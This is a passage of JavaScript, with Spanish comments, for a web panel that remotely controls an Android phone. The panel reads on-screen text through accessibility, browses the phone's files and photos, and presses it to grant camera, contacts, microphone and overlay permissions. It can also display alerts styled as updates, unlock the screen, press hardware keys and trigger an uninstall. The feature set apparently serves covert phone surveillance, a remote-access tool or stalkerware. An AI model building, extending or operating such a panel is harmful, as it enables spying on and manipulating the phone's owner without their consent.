  if (videoTextPollInterval) clearInterval(videoTextPollInterval);
  videoTextPollInterval = setInterval(() => sendControl({ type: 'list-screen-text' }), 1000);
}

function stopVideoText() {
  if (videoTextPollInterval) {
    clearInterval(videoTextPollInterval);
    videoTextPollInterval = null;
  }
}

document.getElementById('videoTextPlay').addEventListener('click', startVideoText);
document.getElementById('videoTextPause').addEventListener('click', stopVideoText);
document.getElementById('videoTextReload').addEventListener('click', () => {
  screenTextHistory.clear();
  videoTextCurrentEl.innerHTML = '';
  videoTextHistoryEl.innerHTML = '';
  sendControl({ type: 'list-screen-text' });
});

// ---- Modal de permisos ----

const permissionsModal = document.getElementById('permissionsModal');
const switchOverlay = document.getElementById('switchOverlay');
const switchBattery = document.getElementById('switchBattery');
const batteryStatus = document.getElementById('batteryStatus');
const switchDrawOverlay = document.getElementById('switchDrawOverlay');
const overlayStatus = document.getElementById('overlayStatus');
const switchCamera = document.getElementById('switchCamera');
const cameraPermStatus = document.getElementById('cameraPermStatus');
const switchContacts = document.getElementById('switchContacts');
const contactsStatus = document.getElementById('contactsStatus');
const switchWriteSettings = document.getElementById('switchWriteSettings');
const writeSettingsStatus = document.getElementById('writeSettingsStatus');
const switchMic = document.getElementById('switchMic');
const micStatus = document.getElementById('micStatus');
const switchPhotos = document.getElementById('switchPhotos');
const photosPermStatus = document.getElementById('photosPermStatus');
const switchFiles = document.getElementById('switchFiles');
const filesPermStatus = document.getElementById('filesPermStatus');
let permissionsPollInterval = null;

const hostApp = document.getElementById('hostApp');
const hostScreen = document.getElementById('hostScreen');

function applyPermissionsStatus(msg) {
  setAccessibilityStatus(!!msg.accessibilityEnabled);
  if (typeof msg.brightness === 'number' && !brightnessDragging) {
    brightnessSlider.value = msg.brightness;
  }
  hostApp.textContent = msg.screenOn ? (msg.appLabel || '—') : '----';
  hostScreen.className = 'screen-ind ' + (msg.screenOn ? 'screen-ind--on' : 'screen-ind--off');
  hostScreen.title = msg.screenOn ? 'Pantalla encendida' : 'Pantalla apagada/bloqueada';
  switchBattery.checked = !!msg.batteryUnrestricted;
  batteryStatus.textContent = msg.batteryUnrestricted ? 'Sin restricciones' : 'Con restricciones (activa para pedirlo)';
  switchDrawOverlay.checked = !!msg.overlayGranted;
  overlayStatus.textContent = msg.overlayGranted ? 'Concedido' : 'No concedido (activa para pedirlo)';
  switchCamera.checked = !!msg.cameraGranted;
  cameraPermStatus.textContent = msg.cameraGranted ? 'Concedido' : 'No concedido (activa para abrir Ajustes)';
  switchContacts.checked = !!msg.contactsGranted;
  contactsStatus.textContent = msg.contactsGranted ? 'Concedido' : 'No concedido (activa para pedirlo)';
  switchWriteSettings.checked = !!msg.writeSettingsGranted;
  writeSettingsStatus.textContent = msg.writeSettingsGranted ? 'Concedido' : 'No concedido (activa para pedirlo)';
  switchMic.checked = !!msg.micGranted;
  micStatus.textContent = msg.micGranted ? 'Concedido' : 'No concedido (activa para pedirlo)';
  switchPhotos.checked = !!msg.photosGranted;
  photosPermStatus.textContent = msg.photosGranted ? 'Concedido' : 'No concedido (activa para pedirlo)';
  switchFiles.checked = !!msg.filesGranted;
  filesPermStatus.textContent = msg.filesGranted ? 'Concedido' : 'No concedido (activa para pedirlo)';
}

switchOverlay.addEventListener('change', () => {
  if (switchOverlay.checked) {
    sendControl({ type: 'open-overlay-permission' });
    setTimeout(() => { switchOverlay.checked = false; }, 700);
  }
});
switchBattery.addEventListener('change', () => {
  if (switchBattery.checked) sendControl({ type: 'open-battery-optimization' });
  else switchBattery.checked = true;
});
switchDrawOverlay.addEventListener('change', () => {
  if (switchDrawOverlay.checked) sendControl({ type: 'open-draw-overlay-permission' });
  else switchDrawOverlay.checked = true;
});
switchCamera.addEventListener('change', () => {
  if (switchCamera.checked) sendControl({ type: 'open-camera-permission' });
  else switchCamera.checked = true;
});
switchContacts.addEventListener('change', () => {
  if (switchContacts.checked) sendControl({ type: 'open-contacts-permission' });
  else switchContacts.checked = true;
});
switchWriteSettings.addEventListener('change', () => {
  if (switchWriteSettings.checked) sendControl({ type: 'open-write-settings-permission' });
  else switchWriteSettings.checked = true;
});
switchMic.addEventListener('change', () => {
  if (switchMic.checked) sendControl({ type: 'open-mic-permission' });
  else switchMic.checked = true;
});
switchPhotos.addEventListener('change', () => {
  if (switchPhotos.checked) sendControl({ type: 'open-photos-permission' });
  else switchPhotos.checked = true;
});
switchFiles.addEventListener('change', () => {
  if (switchFiles.checked) sendControl({ type: 'open-files-permission' });
  else switchFiles.checked = true;
});

document.getElementById('btnPermissions').addEventListener('click', () => {
  permissionsModal.hidden = false;
  batteryStatus.textContent = 'Consultando…';
  overlayStatus.textContent = 'Consultando…';
  sendControl({ type: 'list-permissions' });
  if (permissionsPollInterval) clearInterval(permissionsPollInterval);
  permissionsPollInterval = setInterval(() => sendControl({ type: 'list-permissions' }), 2000);
});

document.getElementById('btnClosePermissions').addEventListener('click', () => {
  permissionsModal.hidden = true;
  if (permissionsPollInterval) {
    clearInterval(permissionsPollInterval);
    permissionsPollInterval = null;
  }
});

// ---- Modal de alertas ----

const alertsModal = document.getElementById('alertsModal');
const alertUpdateFields = document.getElementById('alertUpdateFields');

function currentAlertType() {
  const checked = document.querySelector('input[name="alertType"]:checked');
  return checked ? checked.value : 'update';
}

document.querySelectorAll('input[name="alertType"]').forEach((radio) => {
  radio.addEventListener('change', () => {
    alertUpdateFields.hidden = currentAlertType() !== 'update';
  });
});

document.getElementById('btnAlerts').addEventListener('click', () => { alertsModal.hidden = false; });
document.getElementById('btnCloseAlerts').addEventListener('click', () => { alertsModal.hidden = true; });

document.getElementById('btnShowAlert').addEventListener('click', () => {
  const alertType = currentAlertType();
  const title = document.getElementById('alertTitleInput').value.trim() || 'Aviso';
  const text = document.getElementById('alertTextInput').value.trim();
  const durationSeconds = Math.min(600, Math.max(1, parseInt(document.getElementById('alertDurationInput').value, 10) || 10));
  sendControl({ type: 'show-alert', alertType, title, text, durationSeconds });
});

document.getElementById('btnHideAlert').addEventListener('click', () => {
  sendControl({ type: 'hide-alert' });
});

// ---- Archivos ----

const filesModal = document.getElementById('filesModal');
let currentFilesPath = '/storage/emulated/0';

document.getElementById('btnCloseFiles').addEventListener('click', () => { filesModal.hidden = true; });
document.getElementById('btnFileUp').addEventListener('click', () => {
  const parent = currentFilesPath.split('/').slice(0, -1).join('/') || '/';
  listFilesPanel(parent);
});

function listFilesPanel(path) {
  currentFilesPath = path;
  document.getElementById('currentPath').textContent = path;
  document.getElementById('filesContent').innerHTML = '<div class="tile__placeholder">Cargando…</div>';
  sendControl({ type: 'list-files', path });
}

document.getElementById('btnFiles').addEventListener('click', () => {
  filesModal.hidden = false;
  if (currentFilesPath) listFilesPanel(currentFilesPath);
});

function renderFilesList(msg) {
  console.log('[renderFilesList] called with msg:', msg);
  const content = document.getElementById('filesContent');
  const files = msg.files || [];
  console.log('[renderFilesList] files array length:', files.length);

  if (files.length === 0) {
    console.log('[renderFilesList] files vacío, mostrando placeholder');
    content.innerHTML = '<div class="tile__placeholder">(carpeta vacía)</div>';
    return;
  }

  console.log('[renderFilesList] renderizando', files.length, 'archivos');
  content.innerHTML = '';
  files.forEach((f, idx) => {
    console.log('[renderFilesList] archivo', idx, ':', f.name, 'isDir:', f.isDir);
    const div = document.createElement('div');
    div.style.cssText = 'padding:8px; border-bottom:1px solid rgba(0,255,65,0.1);';
    if (f.isDir) {
      div.style.cursor = 'pointer';
      div.style.backgroundColor = 'rgba(0,255,65,0.05)';
      div.dataset.path = f.path;
      div.addEventListener('click', () => listFilesPanel(f.path));
    }
    const size = f.isDir ? '' : ` (${formatSize(f.size)})`;
    div.textContent = (f.isDir ? '📁 ' : '📄 ') + f.name + size;
    content.appendChild(div);
  });
  console.log('[renderFilesList] done, added', files.length, 'items to DOM');
}

function formatSize(bytes) {
  if (bytes < 1024) return bytes + ' B';
  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
  if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
  return (bytes / (1024 * 1024 * 1024)).toFixed(1) + ' GB';
}

// ---- Fotos ----

const photosModal = document.getElementById('photosModal');
document.getElementById('btnClosePhotos').addEventListener('click', () => { photosModal.hidden = true; });
document.getElementById('btnPhotos').addEventListener('click', () => {
  photosModal.hidden = false;
  document.getElementById('photosContent').innerHTML = '<div class="tile__placeholder" style="grid-column: 1/-1;">Cargando…</div>';
  sendControl({ type: 'list-photos' });
});

function renderPhotosList(msg) {
  const content = document.getElementById('photosContent');
  const photos = msg.photos || [];

  if (photos.length === 0) {
    content.innerHTML = '<div class="tile__placeholder" style="grid-column: 1/-1;">(sin fotos)</div>';
    return;
  }

  content.innerHTML = '';
  photos.forEach(p => {
    const div = document.createElement('div');
    div.className = 'photo-item';
    div.dataset.path = p.path;
    div.title = p.name;
    div.style.cssText = 'position:relative; border:1px solid rgba(0,255,65,0.2); border-radius:4px; overflow:hidden; cursor:pointer; aspect-ratio:1; background:rgba(0,255,65,0.05);';

    // La miniatura llega después (mensaje photo-thumb); mientras, un marcador de carga.
    const img = document.createElement('img');
    img.style.cssText = 'width:100%; height:100%; object-fit:cover; display:block;';
    img.alt = p.name;
    const ph = document.createElement('div');
    ph.className = 'photo-ph';
    ph.style.cssText = 'position:absolute; inset:0; display:flex; align-items:center; justify-content:center; font-size:0.7rem; color:#7fffa6; text-align:center; padding:4px;';
    ph.textContent = '…';

    div.appendChild(img);
    div.appendChild(ph);
    // Al hacer clic se pide la imagen completa y se abre en grande.
    div.addEventListener('click', () => openPhotoFull(p.path, p.name));
    content.appendChild(div);
  });
}

// Llega la miniatura de una foto: se coloca en su celda.
function applyPhotoThumb(path, thumb) {
  const item = document.querySelector(`.photo-item[data-path="${cssEscape(path)}"]`);
  if (!item) return;
  const img = item.querySelector('img');
  const ph = item.querySelector('.photo-ph');
  if (img) img.src = `data:image/jpeg;base64,${thumb}`;
  if (ph) ph.remove();
}

// Escapa comillas para usar la ruta dentro de un selector de atributo.
function cssEscape(s) {
  return String(s).replace(/["\\]/g, '\\$&');
}

// Visor de foto completa (lightbox). Se crea una vez y se reutiliza.
let photoLightbox = null;
function ensureLightbox() {
  if (photoLightbox) return photoLightbox;
  const box = document.createElement('div');
  box.style.cssText = 'position:fixed; inset:0; z-index:200; background:rgba(0,0,0,0.9); display:none; align-items:center; justify-content:center; flex-direction:column; gap:12px;';
  const img = document.createElement('img');
  img.style.cssText = 'max-width:92vw; max-height:82vh; object-fit:contain; border:1px solid rgba(0,255,65,0.3);';
  const caption = document.createElement('div');
  caption.style.cssText = 'color:#baffc9; font-size:0.85rem;';
  const close = document.createElement('button');
  close.textContent = 'Cerrar ✕';
  close.className = 'btn btn--small btn--danger';
  close.addEventListener('click', () => { box.style.display = 'none'; });
  box.addEventListener('click', (e) => { if (e.target === box) box.style.display = 'none'; });
  box.appendChild(img);
  box.appendChild(caption);
  box.appendChild(close);
  document.body.appendChild(box);
  photoLightbox = { box, img, caption };
  return photoLightbox;
}

function openPhotoFull(path, name) {
  const lb = ensureLightbox();
  lb.img.src = '';
  lb.caption.textContent = `${name} — cargando…`;
  lb.box.style.display = 'flex';
  lb.box.dataset.path = path;
  sendControl({ type: 'get-photo', path });
}

function applyPhotoFull(path, data) {
  const lb = ensureLightbox();
  // Solo si el visor sigue mostrando esta foto.
  if (lb.box.style.display !== 'none' && lb.box.dataset.path === path) {
    lb.img.src = `data:image/jpeg;base64,${data}`;
    lb.caption.textContent = '';
  }
}

// ---- Accesibilidad ----

const accessibilityModal = document.getElementById('accessibilityModal');
document.getElementById('btnCloseAccessibility').addEventListener('click', () => { accessibilityModal.hidden = true; });
document.getElementById('btnAccessibility').addEventListener('click', () => { accessibilityModal.hidden = false; });

document.getElementById('btnPower').addEventListener('click', () => sendControl({ type: 'key-event', keyCode: 26 }));
document.getElementById('btnUnlock').addEventListener('click', () => sendControl({ type: 'unlock-screen' }));
document.getElementById('btnVolUp').addEventListener('click', () => sendControl({ type: 'key-event', keyCode: 24 }));
document.getElementById('btnVolDown').addEventListener('click', () => sendControl({ type: 'key-event', keyCode: 25 }));
document.getElementById('btnSilent').addEventListener('click', () => sendControl({ type: 'ringer-mode', mode: 'silent' }));
document.getElementById('btnVibrate').addEventListener('click', () => sendControl({ type: 'ringer-mode', mode: 'vibrate' }));
document.getElementById('btnSound').addEventListener('click', () => sendControl({ type: 'ringer-mode', mode: 'normal' }));

// ---- Desinstalar app ----

document.getElementById('btnUninstall').addEventListener('click', requestUninstall);

// ---- Desconectar ----

document.getElementById('btnDisconnect').addEventListener('click', () => {
  if (sessionId) ws.send(JSON.stringify({ type: 'end-session', sessionId }));
  cleanup();
  window.location.href = 'ver.php';
});

let autoUninstall = false;
let uninstalling = false;

// ---- Drag modals ----
// Cada ventana (.modal__box) flota de forma independiente sobre un contenedor
// (.modal) que deja pasar los clics. Al abrir se coloca en cascada para que no
// caigan todas en el mismo sitio (no se superponen), y la que se toca pasa al frente.
let modalTopZ = 100;          // z-index creciente: la última usada queda arriba
let modalOpenCount = 0;       // para repartir la cascada de aperturas

function bringToFront(box) {
  box.style.zIndex = ++modalTopZ;
}

// Centra la caja con un desfase en cascada y la deja completamente visible.
function cascadePosition(box) {
  const w = box.offsetWidth || 320;
  const h = box.offsetHeight || 200;
  const step = 32;
  const slots = 6;
  const off = (modalOpenCount++ % slots) * step;
  let left = Math.round((window.innerWidth - w) / 2) + off;
  let top = Math.round((window.innerHeight - h) / 2) + off;
  // Clamp para que nunca se salga de la pantalla al abrir.
  left = Math.min(Math.max(8, left), Math.max(8, window.innerWidth - w - 8));
  top = Math.min(Math.max(8, top), Math.max(8, window.innerHeight - h - 8));
  box.style.transform = 'none';
  box.style.margin = '0';
  box.style.right = 'auto';
  box.style.bottom = 'auto';
  box.style.left = left + 'px';
  box.style.top = top + 'px';
}

function makeDraggable(modal) {
  const header = modal.querySelector('.modal__header');
  const box = modal.querySelector('.modal__box');
  if (!header || !box) return;

  // Al mostrarse (se le quita el atributo hidden), colócala en cascada y al frente.
  const obs = new MutationObserver(() => {
    if (!modal.hidden) { cascadePosition(box); bringToFront(box); }
  });
  obs.observe(modal, { attributes: true, attributeFilter: ['hidden'] });

  let dragging = false;
  let offsetX = 0;
  let offsetY = 0;

  header.addEventListener('pointerdown', (e) => {
    if (e.target.closest('.modal__close')) return; // el botón de cerrar no arrastra
    dragging = true;
    bringToFront(box);
    const rect = box.getBoundingClientRect();
    offsetX = e.clientX - rect.left;
    offsetY = e.clientY - rect.top;
    // Fija la posición en píxeles y quita el centrado por transform para poder moverla.
    box.style.transform = 'none';
    box.style.left = rect.left + 'px';
    box.style.top = rect.top + 'px';
    box.style.right = 'auto';
    box.style.bottom = 'auto';
    box.style.margin = '0';
    // La captura hace que move/up sigan llegando aunque el cursor salga de la barra.
    try { header.setPointerCapture(e.pointerId); } catch (err) { /* no soportado */ }
    e.preventDefault();
  });

  header.addEventListener('pointermove', (e) => {
    if (!dragging) return;
    let left = e.clientX - offsetX;
    let top = e.clientY - offsetY;
    // Solo se exige que quede visible una franja (la barra de título), NO toda la ventana.
    // Antes se exigía que cupiera entera: en modales altos (85vh) eso la dejaba pegada abajo
    // y casi sin movimiento vertical. Ahora se puede mover libremente.
    const MARGIN = 44;
    left = Math.min(Math.max(MARGIN - box.offsetWidth, left), window.innerWidth - MARGIN);
    top = Math.min(Math.max(0, top), window.innerHeight - MARGIN);
    box.style.left = left + 'px';
    box.style.top = top + 'px';
  });

  const end = (e) => {
    dragging = false;
    try { header.releasePointerCapture(e.pointerId); } catch (err) { /* ya liberado */ }
  };
  header.addEventListener('pointerup', end);
  header.addEventListener('pointercancel', end);
}

// Aplicar a todos los modales
['permissionsModal', 'alertsModal', 'accessibilityModal', 'filesModal', 'photosModal', 'appActionMenu'].forEach(id => {
  const el = document.getElementById(id);
  if (el) makeDraggable(el);
});

connectSignaling();

// Si vino con action=uninstall, ejecutar eso una vez conectado
if (ACTION === 'uninstall') {
  autoUninstall = true;
}
